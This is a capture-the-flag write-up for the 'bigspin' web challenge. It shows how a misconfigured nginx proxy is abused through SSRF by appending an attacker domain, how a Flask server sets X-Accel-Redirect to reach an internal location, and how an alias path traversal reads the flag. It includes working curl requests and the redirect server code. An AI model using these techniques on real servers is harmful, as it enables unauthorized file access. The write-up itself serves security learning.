---
tags: ["web", "traversal", "nginx", "ssrf", "prox"]
author: "bennofs"
---
# Challenge
> This app got hacked due to admin and uberadmin directories being open. Was just about to wget -r it, but then they fixed it :( Can you help me get the files again?

When visiting the site, it just displays a simple sentence:

> What's it gonna be? Are you an uberadmin, an admin, a user, or (most likely) just a pleb? 

where uberadmin, admin, user and pleb are links:

- `/uberadmin` gives 403 (nginx)
- `/admin` is 404 (nginx)
- `/user` is also 403 (nginx)
- `/pleb` displays the contents of https://example.org

# Solution

After playing around a little bit, we discover that all paths beginning with `/uberadmin` or `/user` are disallowed. Interestingly, `/userSOME_SUFFIX` is also blocked. This suggests that the nginx config uses `location` without trailing slash, so https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md may be applicable.
Also, `http://bigspin-01.play.midnightsunctf.se:3123/plebSOME_SUFFIX` results in `502 Bad Gateway` so the server is likely using `example.org` as upstream and just proxies `/pleb` there.

A quick test with `http://bigspin-01.play.midnightsunctf.se:3123/pleb.mydomain.com` confirms this theory, as DNS requests to `example.com.mydomain.com` show up in logs. We can list the contents of the user directory with [localtest.me](https://readme.localtest.me): http://bigspin-01.play.midnightsunctf.se:3123/pleb.localtest.me/user/. This reveals that `/user/nginx.cönf` exists, which can be obtained via double URL encoding (due to the proxying):

```nginx
$ curl 'http://bigspin-01.play.midnightsunctf.se:3123/pleb.localtest.me/user/nginx.c%25C3%25B6nf%2520'
worker_processes 1;
user nobody nobody;
error_log /dev/stdout;
pid /tmp/nginx.pid;
events {
  worker_connections 1024;
}

http {

    # Set an array of temp and cache files options that otherwise defaults to
    # restricted locations accessible only to root.

    client_body_temp_path /tmp/client_body;
    fastcgi_temp_path /tmp/fastcgi_temp;
    proxy_temp_path /tmp/proxy_temp;
    scgi_temp_path /tmp/scgi_temp;
    uwsgi_temp_path /tmp/uwsgi_temp;
    resolver 8.8.8.8 ipv6=off;

    server {
        listen 80;

        location / {
            root /var/www/html/public;
            try_files $uri $uri/index.html $uri/ =404;
        }

        location /user {
            allow 127.0.0.1;
            deny all;
            autoindex on;
            root /var/www/html/;
        }

        location /admin {
            internal;
            autoindex on;
            alias /var/www/html/admin/;
        }

        location /uberadmin {
            allow 0.13.3.7;
            deny all;
            autoindex on;
            alias /var/www/html/uberadmin/;
        }

        location ~ /pleb([/a-zA-Z0-9.:%]+) {
            proxy_pass   http://example.com$1;
        }

        access_log /dev/stdout;
        error_log /dev/stdout;
    }

}
```
We now see that `/admin` is marked as `internal`. Quoting the [nginx docs](http://nginx.org/en/docs/http/ngx_http_core_module.html#internal):

>  Specifies that a given location can only be used for internal requests. For external requests, the client error 404 (Not Found) is returned. Internal requests are the following:
>
> - requests redirected by the error_page, index, random_index, and try_files directives;
> -  requests **redirected by the “X-Accel-Redirect”** response header field from an upstream server;
> -  subrequests formed by the “include virtual” command of the ngx_http_ssi_module module, by the ngx_http_addition_module module directives, and by auth_request and mirror directives;
> - requests changed by the rewrite directive.

To access that, we write a trivial python server that sets `X-Accel-Redirect`:

```python
import os
from flask import Flask,redirect,make_response

app = Flask(__name__)

@app.route('/<path:rest>')
def hello(rest):
    r = make_response()
    print(rest)
    r.headers.set("X-Accel-Redirect", '/' + rest)
    return r

if __name__ == '__main__':
    # Bind to PORT if defined, otherwise default to 5000.
    port = int(os.environ.get('PORT', 80))
    app.run(host='0.0.0.0', port=port)
```

So we access admin, and then use nginx path traversal (this time possible because the `/admin` location uses `alias` instead of `root`) to read the flag from uberadmin:

```
$ curl http://bigspin-01.play.midnightsunctf.se:3123/pleb.ctfip.ddnss.ch/admin/flag.txt
hmmm, should admins really get flags? seems like an uberadmin thing to me

$ curl http://bigspin-01.play.midnightsunctf.se:3123/pleb.ctfip.ddnss.ch/admin../uberadmin/flag.txt
midnight{y0u_sp1n_m3_r1ght_r0und_b@by}
```


# References

- https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf mentions this and lots of other interesting path issues as well
